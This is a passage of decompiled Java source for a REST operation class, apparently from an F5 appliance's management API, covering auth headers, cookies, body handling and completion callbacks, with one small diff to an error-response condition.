  return this.isForceSocketEnabled;\r\n   }\r\n\r\n   public RestOperation setCompletion(RestRequestCompletion completion) {\r\n     this.completion = completion;\r\n     return this;\r\n   }\r\n\r\n   public RestOperation setMethod(RestMethod method) {\r\n     this.method = method;\r\n     return this;\r\n   }\r\n\r\n   public RestMethod getMethod() {\r\n     return this.method;\r\n   }\r\n\r\n   public RestOperation setContentDisposition(String contentDisposition) {\r\n     this.contentDisposition = contentDisposition;\r\n     return this;\r\n   }\r\n\r\n   public String getContentDisposition() {\r\n     return this.contentDisposition;\r\n   }\r\n\r\n   public RestOperation setContentType(String contentType) {\r\n     this.incomingContentType = null;\r\n     this.contentType = contentType;\r\n     return this;\r\n   }\r\n\r\n   public RestOperation setIncomingContentType(String contentType) {\r\n     this.incomingContentType = contentType;\r\n     this.contentType = null;\r\n     return this;\r\n   }\r\n\r\n   public RestOperation defaultToContentTypeJson() {\r\n     return setContentType(\"application/json\");\r\n   }\r\n\r\n   public String getContentType() {\r\n     return (this.contentType == null) ? this.incomingContentType : this.contentType;\r\n   }\r\n\r\n   public String getOutgoingContentType() {\r\n     return this.contentType;\r\n   }\r\n\r\n   public String getOutgoingContentEncoding() {\r\n     if (this.contentEncoding != null) {\r\n       return this.contentEncoding;\r\n     }\r\n\r\n     if (this.contentEncoding == null && this.contentType.equals(\"application/json\")) {\r\n       return MIME_ENCODING_UTF8;\r\n     }\r\n     return null;\r\n   }\r\n\r\n   public RestOperation setContentRange(String contentRange) {\r\n     this.contentRange = contentRange;\r\n     if (this.contentRange != null) {\r\n       this.contentRange = this.contentRange.trim();\r\n     }\r\n     return this;\r\n   }\r\n\r\n   public String getContentRange() {\r\n     if (this.contentRange == null) {\r\n       return null;\r\n     }\r\n     return this.contentRange.trim();\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String getAccept() {\r\n     return this.accept;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setAccept(String accept) {\r\n     this.accept = accept;\r\n     return this;\r\n   }\r\n\r\n   private void setupAuthorizationData() {\r\n     if (this.authorizationData == null) {\r\n       this.authorizationData = new AuthorizationData();\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void setBasicAuthFromIdentity() {\r\n     if (this.authorizationData == null) {\r\n       return;\r\n     }\r\n\r\n     this.authorizationData.basicAuthValue = AuthzHelper.encodeBasicAuth(getAuthUser(), null);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setBasicAuthorizationHeader(String value) {\r\n     setupAuthorizationData();\r\n\r\n\r\n     if (value != null) {\r\n       byte[] data = DatatypeConverter.parseBase64Binary(value);\r\n       if (data == null || data.length == 0) {\r\n         LOGGER.warningFmt(\"Basic Authorization header set to value that is invalid base64. Value: %s\", new Object[] { value });\r\n\r\n         value = null;\r\n       }\r\n     }\r\n\r\n     this.authorizationData.basicAuthValue = value;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setBasicAuthorization(Void dummy) {\r\n     if (this.authorizationData != null) {\r\n       this.authorizationData.basicAuthValue = null;\r\n     }\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setBasicAuthorization(String user, String password) {\r\n     setIdentityData(user, null, null);\r\n     setBasicAuthorizationHeader(AuthzHelper.encodeBasicAuth(user, password));\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setAdminIdentity() {\r\n     RestReference adminReference = AuthzHelper.getDefaultAdminReference();\r\n     if (adminReference != null) {\r\n       setIdentityData(null, adminReference, null);\r\n     }\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setIdentityFrom(RestOperation incomingRequest) {\r\n     this.identityData = null;\r\n     if (incomingRequest.identityData != null) {\r\n       setIdentityData(incomingRequest.identityData.userName, incomingRequest.identityData.userReference, incomingRequest.identityData.groupReferences);\r\n     }\r\n\r\n\r\n     this.authorizationData = null;\r\n     if (incomingRequest.authorizationData != null) {\r\n       this.authorizationData = new AuthorizationData();\r\n       this.authorizationData.basicAuthValue = incomingRequest.authorizationData.basicAuthValue;\r\n     }\r\n\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setIdentityData(String userName, RestReference userReference, RestReference[] groupReferences) {\r\n     if (userName == null && !RestReference.isNullOrEmpty(userReference)) {\r\n\r\n\r\n       String segment = UrlHelper.getLastPathSegment(userReference.link);\r\n       if (userReference.link.equals(UrlHelper.buildPublicUri(UrlHelper.buildUriPath(new String[] { WellKnownPorts.AUTHZ_USERS_WORKER_URI_PATH, segment }))))\r\n       {\r\n         userName = segment;\r\n       }\r\n     }\r\n     if (userName != null && RestReference.isNullOrEmpty(userReference)) {\r\n       userReference = new RestReference(UrlHelper.buildPublicUri(UrlHelper.buildUriPath(new String[] { WellKnownPorts.AUTHZ_USERS_WORKER_URI_PATH, userName })));\r\n     }\r\n\r\n\r\n     this.identityData = new IdentityData();\r\n     this.identityData.userName = userName;\r\n     this.identityData.userReference = userReference;\r\n     this.identityData.groupReferences = groupReferences;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public String getBasicAuthorization() {\r\n     if (this.authorizationData == null) {\r\n       return null;\r\n     }\r\n     return this.authorizationData.basicAuthValue;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setWwwAuthenticate(String authentication) {\r\n     setupAuthorizationData();\r\n     this.authorizationData.wwwAuthenticate = authentication;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setXF5AuthToken(String token) {\r\n     setupAuthorizationData();\r\n     if (token == null) {\r\n       this.authorizationData.xF5AuthTokenState = null;\r\n     } else {\r\n       this.authorizationData.xF5AuthTokenState = new AuthTokenItemState();\r\n       this.authorizationData.xF5AuthTokenState.token = token;\r\n     }\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setXF5AuthTokenState(AuthTokenItemState tokenState) {\r\n     setupAuthorizationData();\r\n     this.authorizationData.xF5AuthTokenState = tokenState;\r\n\r\n     RestOperationIdentifier.updateIdentityFromAuthenticationData(this);\r\n\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n   public RestOperation setXAuthToken(String token) {\r\n     setupAuthorizationData();\r\n     this.authorizationData.xAuthToken = token;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n   public RestOperation setXForwardedFor(String xForwardedFor) {\r\n     this.xForwardedFor = xForwardedFor;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String getWwwAuthenticate() {\r\n     if (this.authorizationData == null) {\r\n       return null;\r\n     }\r\n     return this.authorizationData.wwwAuthenticate;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String getXF5AuthToken() {\r\n     if (this.authorizationData == null || this.authorizationData.xF5AuthTokenState == null) {\r\n       return null;\r\n     }\r\n     return this.authorizationData.xF5AuthTokenState.token;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public AuthTokenItemState getXF5AuthTokenState() {\r\n     if (this.authorizationData == null) {\r\n       return null;\r\n     }\r\n     return this.authorizationData.xF5AuthTokenState;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public String getXAuthToken() {\r\n     if (this.authorizationData == null) {\r\n       return null;\r\n     }\r\n     return this.authorizationData.xAuthToken;\r\n   }\r\n\r\n   public RestOperation setTransferEncoding(String value) {\r\n     this.transferEncoding = value;\r\n     return this;\r\n   }\r\n\r\n   public String getTransferEncoding() {\r\n     return this.transferEncoding;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public String getAuthUser() {\r\n     return (this.identityData == null) ? null : this.identityData.userName;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public boolean doesRequireAuthorization() {\r\n     return (isPublicRequest() || getAuthUser() != null);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestReference getAuthUserReference() {\r\n     return (this.identityData == null) ? null : this.identityData.userReference;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestReference[] getAuthGroupReferences() {\r\n     return (this.identityData == null) ? null : this.identityData.groupReferences;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public List<RestReference> getAuthGroupReferencesList() {\r\n     List<RestReference> list = new ArrayList<>();\r\n\r\n     if (this.identityData == null) {\r\n       return list;\r\n     }\r\n\r\n     if (this.identityData.groupReferences == null) {\r\n       return list;\r\n     }\r\n\r\n     for (RestReference reference : this.identityData.groupReferences) {\r\n       if (!RestReference.isNullOrEmpty(reference)) {\r\n         list.add(reference);\r\n       }\r\n     }\r\n\r\n     return list;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public List<RestReference> getAuthIdentityReferences() {\r\n     List<RestReference> list = new ArrayList<>();\r\n\r\n     if (this.identityData == null) {\r\n       return list;\r\n     }\r\n\r\n     list.addAll(getAuthGroupReferencesList());\r\n\r\n     if (!RestReference.isNullOrEmpty(this.identityData.userReference)) {\r\n       list.add(this.identityData.userReference);\r\n     }\r\n\r\n     return list;\r\n   }\r\n\r\n\r\n\r\n   public String getAuthProviderName() {\r\n     AuthTokenItemState token = getXF5AuthTokenState();\r\n     if (token != null) {\r\n       return token.authProviderName;\r\n     }\r\n\r\n\r\n     return \"local\";\r\n   }\r\n\r\n   public long getContentLength() {\r\n     if (this.contentLength == -1L && this.body == null)\r\n     {\r\n\r\n       getBodyAsString();\r\n     }\r\n     return this.contentLength;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public boolean isContentLengthUnknown() {\r\n     return (this.contentLength == -1L);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public boolean isBodyNull() {\r\n     return (this.body == null && this.binaryBody == null);\r\n   }\r\n\r\n\r\n\r\n\r\n   public boolean isBodyEmpty() {\r\n     if (isBodyNull())\r\n     {\r\n       return true;\r\n     }\r\n\r\n     if (this.binaryBody != null && this.binaryBody.length > 0)\r\n     {\r\n       return false;\r\n     }\r\n\r\n     if (this.body != null && (\r\n       this.body.isEmpty() || \"{}\".equals(this.body))) {\r\n       return true;\r\n     }\r\n\r\n\r\n\r\n     return (isContentLengthUnknown() || getContentLength() == 0L);\r\n   }\r\n\r\n\r\n   public <T> T getTypedBody(Class<T> bodyClass) {\r\n     return bodyClass.cast(getBody(bodyClass));\r\n   }\r\n\r\n   public Object getBody(Type bodyType) {\r\n     if (isBodyEmpty()) {\r\n       return null;\r\n     }\r\n     if (this.deserializedBody != null && this.deserializedBodyType != null && bodyType.equals(this.deserializedBodyType))\r\n     {\r\n\r\n       return this.deserializedBody;\r\n     }\r\n\r\n     this.deserializedBody = gson.fromJson(this.body, bodyType);\r\n     this.deserializedBodyType = bodyType;\r\n     return this.deserializedBody;\r\n   }\r\n\r\n   public String getBodyAsString() {\r\n     return this.body;\r\n   }\r\n\r\n   public byte[] getBinaryBody() {\r\n     return this.binaryBody;\r\n   }\r\n\r\n   public RestOperation setBinaryBody(byte[] binaryBody) {\r\n     return setBody(null, null, binaryBody);\r\n   }\r\n\r\n   public RestOperation setBinaryBody(byte[] binaryBody, String contentType) {\r\n     setBody(null, null, binaryBody);\r\n     return setContentType(contentType);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setBodyFromOp(RestOperation request) {\r\n     this.body = request.body;\r\n     this.binaryBody = request.binaryBody;\r\n\r\n     this.contentLength = request.contentLength;\r\n     this.contentType = request.contentType;\r\n     this.deserializedBody = null;\r\n     this.deserializedBodyType = null;\r\n\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setParsedBody(JsonElement body) {\r\n     return setBody(null, body, null);\r\n   }\r\n\r\n   public RestOperation setBody(String body, String mimeType) {\r\n     return setBody(body, null, null).setContentType(mimeType);\r\n   }\r\n\r\n   public RestOperation setBody(String body) {\r\n     return setBody(body, null, null);\r\n   }\r\n\r\n   public RestOperation setBody(Object body) {\r\n     return setBody(null, body, null);\r\n   }\r\n\r\n\r\n   private RestOperation setBody(String stringBody, Object aObjBody, byte[] aBinaryBody) {\r\n     clearBody();\r\n\r\n     if (stringBody != null) {\r\n\r\n       this.body = stringBody;\r\n       this.contentLength = stringBody.length();\r\n\r\n     }\r\n     else if (aObjBody != null) {\r\n\r\n\r\n       this.body = toJson(aObjBody);\r\n       this.contentLength = this.body.length();\r\n\r\n\r\n       setContentType(\"application/json\");\r\n     } else if (aBinaryBody != null) {\r\n\r\n       this.binaryBody = aBinaryBody;\r\n       this.contentLength = aBinaryBody.length;\r\n     }\r\n\r\n\r\n\r\n     checkSize(this.contentLength);\r\n\r\n     return this;\r\n   }\r\n   public void checkSize(long requiredCapacity) {\r\n     int maxSize = maxMessageBodySize.get();\r\n     if (requiredCapacity > maxSize) {\r\n       throw new IllegalArgumentException(\"Message body size of \" + requiredCapacity + \" bytes\" + \" exceeds the maximum allowed size of \" + maxSize + \" bytes\");\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public JsonElement getParsedBody() {\r\n     if (this.body == null) {\r\n       return null;\r\n     }\r\n\r\n     return toJsonTree(this.body);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public boolean hasProperty(String propertyName) {\r\n     if (this.binaryBody != null) {\r\n       return false;\r\n     }\r\n\r\n     if (!\"application/json\".equals(this.contentType)) {\r\n       return false;\r\n     }\r\n\r\n     if (this.body == null) {\r\n       return false;\r\n     }\r\n\r\n     if (!this.body.contains(\"\\\"\" + propertyName + \"\\\"\")) {\r\n       return false;\r\n     }\r\n\r\n     JsonElement parsedBody = getParsedBody();\r\n     if (parsedBody.isJsonObject()) {\r\n       JsonObject bodyObj = parsedBody.getAsJsonObject();\r\n       return bodyObj.has(propertyName);\r\n     }\r\n\r\n     return false;\r\n   }\r\n\r\n\r\n\r\n\r\n   public RestOperation setUri(URI uri) {\r\n     this.uri = uri;\r\n     HttpParserHelper.parseUriParameters(this, uri);\r\n     return this;\r\n   }\r\n\r\n   public URI getUri() {\r\n     return this.uri;\r\n   }\r\n\r\n   public RestOperation setStatusCode(int statusCode) {\r\n     this.statusCode = statusCode;\r\n     return this;\r\n   }\r\n\r\n   public int getStatusCode() {\r\n     return this.statusCode;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public final RestOperation setExpiration(Date expiration) {\r\n     if (expiration == null) {\r\n       throw new IllegalArgumentException(\"expiration may not be null\");\r\n     }\r\n     this.expiration = expiration;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public final Date getExpiration() {\r\n     return this.expiration;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public boolean hasExpired() {\r\n     return hasExpired(new Date());\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public boolean hasExpired(Date now) {\r\n     if (this.expiration.after(now)) {\r\n       return false;\r\n     }\r\n     return true;\r\n   }\r\n\r\n   public Map<String, String> getParameters() {\r\n     return this.parameters;\r\n   }\r\n\r\n   public RestOperation setParameter(String name, String value) {\r\n     RestHelper.setKeyValuePair(this.parameters, name, value);\r\n     return this;\r\n   }\r\n\r\n   public String getParameter(String name) {\r\n     return this.parameters.get(name);\r\n   }\r\n\r\n   public void removeParameter(String name) {\r\n     this.parameters.remove(name);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void setCookies(Map<String, String> cookies) {\r\n     setCookies(cookies, Direction.getDirection(this.isResponse));\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void setCookies(Map<String, String> cookies, Direction direction) {\r\n     StringBuilder sb = new StringBuilder();\r\n     for (Map.Entry<String, String> cookie : cookies.entrySet())\r\n     {\r\n\r\n       sb.append(((String)cookie.getKey()).trim()).append(\"=\").append(cookie.getValue()).append(\";\");\r\n     }\r\n\r\n\r\n\r\n\r\n     addAdditionalHeader(direction, \"Cookie\", sb.toString());\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public Map<String, String> getCookies() {\r\n     return getCookies(Direction.getDirection(this.isResponse));\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public Map<String, String> getCookies(Direction direction) {\r\n     HashMap<String, String> cookieMap = new HashMap<>();\r\n\r\n     String cookies = getAdditionalHeader(direction, \"Cookie\");\r\n     if (cookies != null) {\r\n       HttpParserHelper.parseRequestKeyValuePairs(cookies, cookieMap, \";\");\r\n     }\r\n\r\n\r\n\r\n\r\n\r\n\r\n     Map<String, String> trimmedCookies = new HashMap<>();\r\n     for (String key : cookieMap.keySet()) {\r\n       String trimmedKey = key.trim();\r\n       String value = cookieMap.get(key);\r\n       String trimmedValue = value.trim();\r\n       trimmedCookies.put(trimmedKey, trimmedValue);\r\n     }\r\n\r\n     return trimmedCookies;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setCookie(String name, String value) {\r\n     return setCookie(name, value, Direction.getDirection(this.isResponse));\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setCookie(String name, String value, Direction direction) {\r\n     Map<String, String> cookies = getCookies(direction);\r\n     RestHelper.setKeyValuePair(cookies, name, value);\r\n     setCookies(cookies, direction);\r\n\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String getCookie(String name) {\r\n     return getCookie(name, Direction.getDirection(this.isResponse));\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String getCookie(String name, Direction direction) {\r\n     Map<String, String> cookies = getCookies(direction);\r\n\r\n     if (cookies != null) {\r\n       return cookies.get(name);\r\n     }\r\n     return null;\r\n   }\r\n\r\n\r\n\r\n\r\n   private void allocateHttpHeaders() {\r\n     if (this.additionalHeaders == null) {\r\n       this.additionalHeaders = new HttpHeaderFields[2];\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public HttpHeaderFields getAdditionalHeaders() {\r\n     allocateHttpHeaders();\r\n     return this.additionalHeaders[responseToIndex()];\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public HttpHeaderFields getAdditionalHeaders(Direction specificDirection) {\r\n     allocateHttpHeaders();\r\n     if (this.additionalHeaders[specificDirection.getIndex()] == null) {\r\n       this.additionalHeaders[specificDirection.getIndex()] = new HttpHeaderFields();\r\n     }\r\n     return this.additionalHeaders[specificDirection.getIndex()];\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String getAdditionalHeader(String name) {\r\n     allocateHttpHeaders();\r\n     if (this.additionalHeaders[responseToIndex()] == null) {\r\n       this.additionalHeaders[responseToIndex()] = new HttpHeaderFields();\r\n     }\r\n     return getAdditionalHeader(Direction.getDirection(this.isResponse), name);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String getAdditionalHeader(Direction specificDirection, String name) {\r\n     allocateHttpHeaders();\r\n     if (this.additionalHeaders[specificDirection.getIndex()] == null) {\r\n       return \"\";\r\n     }\r\n\r\n     return this.additionalHeaders[specificDirection.getIndex()].getHeaderField(name);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void addAdditionalHeaders(Direction specificDirection, HttpHeaderFields headers) {\r\n     this.additionalHeaders[specificDirection.getIndex()] = headers;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void addAdditionalHeader(Direction specificDirection, String name, String value) {\r\n     allocateHttpHeaders();\r\n     if (this.additionalHeaders[specificDirection.getIndex()] == null) {\r\n       this.additionalHeaders[specificDirection.getIndex()] = new HttpHeaderFields();\r\n     }\r\n\r\n     this.additionalHeaders[specificDirection.getIndex()].addHeaderField(name, value, specificDirection.toString());\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String removeAdditionalHeader(String name) {\r\n     return removeAdditionalHeader(Direction.getDirection(this.isResponse), name);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String removeAdditionalHeader(Direction specificDirection, String name) {\r\n     allocateHttpHeaders();\r\n     if (this.additionalHeaders[specificDirection.getIndex()] == null) {\r\n       return \"\";\r\n     }\r\n\r\n     return this.additionalHeaders[specificDirection.getIndex()].removeHeaderField(name);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void addAdditionalHeader(String name, String value) {\r\n     addAdditionalHeader(Direction.getDirection(this.isResponse), name, value);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   private String getAdditionalHeadersAsString(String linePrefix) {\r\n     allocateHttpHeaders();\r\n     StringBuilder sb = new StringBuilder(linePrefix + \"Request:\");\r\n     if (this.additionalHeaders[Direction.REQUEST.getIndex()] == null) {\r\n       sb.append(\"<empty>\");\r\n     } else {\r\n       sb.append(this.additionalHeaders[Direction.REQUEST.getIndex()].getAdditionalHeadersAsString(linePrefix));\r\n     }\r\n\r\n     sb.append(linePrefix + \"Response:\");\r\n     if (this.additionalHeaders[Direction.RESPONSE.getIndex()] == null) {\r\n       sb.append(\"<empty>\");\r\n     } else {\r\n       sb.append(this.additionalHeaders[Direction.RESPONSE.getIndex()].getAdditionalHeadersAsString(linePrefix));\r\n     }\r\n\r\n\r\n     return sb.toString();\r\n   }\r\n\r\n\r\n\r\n\r\n   public enum Direction\r\n   {\r\n     REQUEST(false),\r\n\r\n     RESPONSE(true);\r\n\r\n     private int index;\r\n\r\n     private String name;\r\n\r\n     Direction(boolean isResponse) {\r\n       this.index = isResponse ? 1 : 0;\r\n       this.name = isResponse ? \"response\" : \"request\";\r\n     }\r\n\r\n     public int getIndex() {\r\n       return this.index;\r\n     }\r\n\r\n\r\n     public String toString() {\r\n       return this.name;\r\n     }\r\n\r\n     public static Direction getDirection(boolean isResponse) {\r\n       return isResponse ? RESPONSE : REQUEST;\r\n     }\r\n\r\n     public static Direction opposite(Direction direction) {\r\n       return (direction == RESPONSE) ? REQUEST : RESPONSE;\r\n     }\r\n   }\r\n\r\n   private int responseToIndex() {\r\n     return Direction.getDirection(this.isResponse).getIndex();\r\n   }\r\n\r\n   public RestOperation setCoordinationId(String value) {\r\n     this.coordinationId = value;\r\n     return this;\r\n   }\r\n\r\n   public String getCoordinationId() {\r\n     return this.coordinationId;\r\n   }\r\n\r\n   public RestOperation setAllow(String value) {\r\n     this.allow = value;\r\n     return this;\r\n   }\r\n\r\n   public String getAllow() {\r\n     return this.allow;\r\n   }\r\n\r\n   public RestOperation setResourceDeprecated(Boolean value) {\r\n     this.resourceDeprecated = value;\r\n     return this;\r\n   }\r\n\r\n   public Boolean getResourceDeprecated() {\r\n     return Boolean.valueOf((this.resourceDeprecated != null && this.resourceDeprecated.booleanValue()));\r\n   }\r\n\r\n   public RestOperation setResourceEarlyAccess(Boolean value) {\r\n     this.resourceEarlyAccess = value;\r\n     return this;\r\n   }\r\n\r\n   public Boolean getResourceEarlyAccess() {\r\n     return Boolean.valueOf((this.resourceEarlyAccess != null && this.resourceEarlyAccess.booleanValue()));\r\n   }\r\n\r\n   public RestOperation setPropertyDeprecated(Boolean value) {\r\n     this.propertyDeprecated = value;\r\n     return this;\r\n   }\r\n\r\n   public Boolean getPropertyDeprecated() {\r\n     return Boolean.valueOf((this.propertyDeprecated != null && this.propertyDeprecated.booleanValue()));\r\n   }\r\n\r\n   public RestOperation setPropertyEarlyAccess(Boolean value) {\r\n     this.propertyEarlyAccess = value;\r\n     return this;\r\n   }\r\n\r\n   public Boolean getPropertyEarlyAccess() {\r\n     return Boolean.valueOf((this.propertyEarlyAccess != null && this.propertyEarlyAccess.booleanValue()));\r\n   }\r\n\r\n   public boolean containsApiStatusInformation() {\r\n     return (getResourceDeprecated().booleanValue() || getResourceEarlyAccess().booleanValue() || getPropertyDeprecated().booleanValue() || getPropertyEarlyAccess().booleanValue());\r\n   }\r\n\r\n\r\n   public void setXF5ConfigApiStatus(long bitMask) {\r\n     this.xF5ConfigApiStatus = bitMask;\r\n   }\r\n\r\n   public long getXF5ConfigApiStatus() {\r\n     return this.xF5ConfigApiStatus;\r\n   }\r\n\r\n   public RestOperation setOrigin(String value) {\r\n     this.origin = value;\r\n     return this;\r\n   }\r\n\r\n   public String getOrigin() {\r\n     return this.origin;\r\n   }\r\n\r\n   public List<ParsedCollectionEntry> getParsedCollectionEntries() {\r\n     return this.parsedUriCollectionEntries;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   EnumSet<RestOperationFlags> getRestOperationFlags() {\r\n     return this.restOperationFlags;\r\n   }\r\n\r\n   public void setSourceAddress(SocketAddress sourceAddress) {\r\n     this.sourceAddress = sourceAddress;\r\n   }\r\n\r\n   public SocketAddress getSourceAddress() {\r\n     return this.sourceAddress;\r\n   }\r\n\r\n\r\n\r\n\r\n   public boolean isRollbackRequest() {\r\n     return this.isRollbackRequest;\r\n   }\r\n\r\n\r\n\r\n\r\n   public RestOperation setRollbackRequest(boolean isRollback) {\r\n     this.isRollbackRequest = isRollback;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n   public RestOperation setParsedCollectionEntries(List<ParsedCollectionEntry> parsedList) {\r\n     this.parsedUriCollectionEntries = parsedList;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n+\r\n   public boolean generateRestErrorResponse() {\r\n-    return ((getContentType() == null || getContentType().contains(\"application/json\")) && isRestErrorResponseRequired());\r\n+    return (getContentType() != null && isRestErrorResponseRequired());\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n-\r\n   public boolean isRestErrorResponseRequired() {\r\n     return this.isRestErrorResponseRequired;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setIsRestErrorResponseRequired(boolean isRestErrorResponseRequired) {\r\n     this.isRestErrorResponseRequired = isRestErrorResponseRequired;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n   public String getIdentifiedGroupName() {\r\n     return this.identifiedGroupName;\r\n   }\r\n\r\n\r\n\r\n\r\n   protected RestOperation setTrustedRequest(boolean value) {\r\n     this.isTrustedRequest = value;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public boolean isTrustedRequest() {\r\n     return this.isTrustedRequest;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setSenderNote(String value) {\r\n     this.senderNote = value;\r\n     return this;\r\n   }\r\n\r\n   public String getSenderNote() {\r\n     return this.senderNote;\r\n   }\r\n\r\n\r\n\r\n\r\n   public RestOperation setGossipHeader(String value) {\r\n     this.gossipHeader = value;\r\n     return this;\r\n   }\r\n\r\n   public String getGossipHeader() {\r\n     return this.gossipHeader;\r\n   }\r\n\r\n   public void complete() {\r\n     if (this.completionCount.incrementAndGet() > 1) {\r\n       if (this.statusCode < 400)\r\n       {\r\n\r\n\r\n         LOGGER.fine(RestHelper.throwableStackToString(new IllegalStateException(String.format(\"Already completed:Referer:%s, target:%s\", new Object[] { this.referer, this.uri }))));\r\n       }\r\n\r\n\r\n       return;\r\n     }\r\n\r\n     if (this.completion == null) {\r\n       return;\r\n     }\r\n\r\n     try {\r\n       if (this.statusCode >= 400) {\r\n         IllegalStateException ise = new IllegalStateException(String.format(\"complete() of %s %s from %s %s called with incompatible status code %s so redirecting to failed()\", new Object[] { getMethod(), getUri(), getReferer(), getRemoteSender(), Integer.valueOf(this.statusCode) }));\r\n\r\n\r\n\r\n\r\n         this.completion.failed(ise, this);\r\n         LOGGER.warning(RestHelper.throwableStackToString(ise));\r\n         return;\r\n       }\r\n     } catch (Exception e) {\r\n       LOGGER.warningFmt(\"Exception in %s %s failure handler: %s\", new Object[] { getMethod(), getUri(), RestHelper.throwableStackToString(e) });\r\n\r\n       return;\r\n     }\r\n\r\n     try {\r\n       this.completion.completed(this);\r\n     } catch (Exception e) {\r\n       try {\r\n         LOGGER.fineFmt(\"Failed attempting to complete a successful %s %s request: %s\", new Object[] { getMethod(), getUri(), RestHelper.throwableStackToString(e) });\r\n\r\n         Exception ex = RestHelper.convertToException(e);\r\n         this.completion.failed(ex, this);\r\n       } catch (Exception eInsideFail) {\r\n         LOGGER.warningFmt(\"Exception in %s %s failed. t: %s tInsideFail: %s\", new Object[] { getMethod(), getUri(), RestHelper.throwableStackToString(e), RestHelper.throwableStackToString(eInsideFail) });\r\n       }\r\n     }\r\n   }\r\n\r\n\r\n\r\n   public void fail(Exception ex, RestErrorResponse err) {\r\n     fail(ex, err, false);\r\n   }\r\n\r\n   public void fail(Exception ex, RestErrorResponse err, boolean allowExternalStackTrace) {\r\n     try {\r\n       String existingBody = getBodyAsString();\r\n\r\n       boolean excludeStack = (!allowExternalStackTrace && isRequestExternal());\r\n\r\n       err.setOriginalRequestBody(existingBody).setCode(this.statusCode).setErrorStack(excludeStack ? null : RestHelper.throwableStackToList(ex)).setReferer(this.referer).setRestOperationId(this.id);\r\n\r\n\r\n\r\n\r\n       setBody(err);\r\n     } finally {\r\n       fail(ex);\r\n     